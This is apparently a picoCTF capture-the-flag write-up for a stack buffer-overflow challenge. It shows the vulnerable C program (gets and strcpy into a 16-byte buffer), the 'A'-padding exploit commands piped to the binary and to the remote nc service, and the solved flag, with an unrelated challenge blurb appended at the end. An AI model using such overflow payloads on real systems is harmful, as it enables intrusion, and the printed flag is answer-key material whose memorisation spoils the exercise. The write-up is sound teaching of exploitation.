# Challenge Description
Smash the stack! Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here. And connect with it using nc saturn.picoctf.net 65362

## Solution:
Step 1: Initial Analysis of the Code
First, I downloaded and examined the source code. The program has several critical vulnerabilities:

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1);
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
Key Observations:

Signal handler prints the flag when SIGSEGV occurs.
strcpy(buf2, input) - copies without bounds checking into a 16-byte buffer.
gets(buf1) - reads unlimited input without bounds checking.
The signal handler is registered to catch segmentation faults.
Step 2: Understanding the Exploitation Strategy
The attack vector is clear: overflow buf2 via strcpy using input from gets. Overwrite the return address or nearby control data to cause a crash, triggering the SIGSEGV handler which prints the flag.

Steps performed
Compiled/tested locally with protections disabled if necessary.
Created a test flag: echo "picoCTF{test_flag_buffer_overflow_works}" > flag.txt.
Sent a payload of repeated 'A's to overflow the buffer and trigger SIGSEGV.
Example commands used:

#Make runnable
```
chmod +x vuln
```
#Local test
```
python3 -c "print('A'*50)" | ./vuln
```
#Remote test
```
python3 -c "print('A'*50)" | nc saturn.picoctf.net 65362
```

## Flag:
```
picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
```
## Concepts learnt:
Overwriting local variables vs return address.
Using cyclic patterns to find offsets.
Endianness when writing raw values.

## Notes:
Initially attempted different payload sizes; 50 'A's was sufficient.
Local testing required creating a fake flag.txt because the remote server hosts the real flag.

## Resources:
Buffer overflow primers and related links.
clutter-overflow
This is a small 64-bit picoCTF binary that reads an uncontrolled string with gets() into a local buffer called clutter, and then checks a nearby stack variable code against the constant 0xdeadbeef. The goal is to overflow clutter and overwrite code so the program prints the flag.


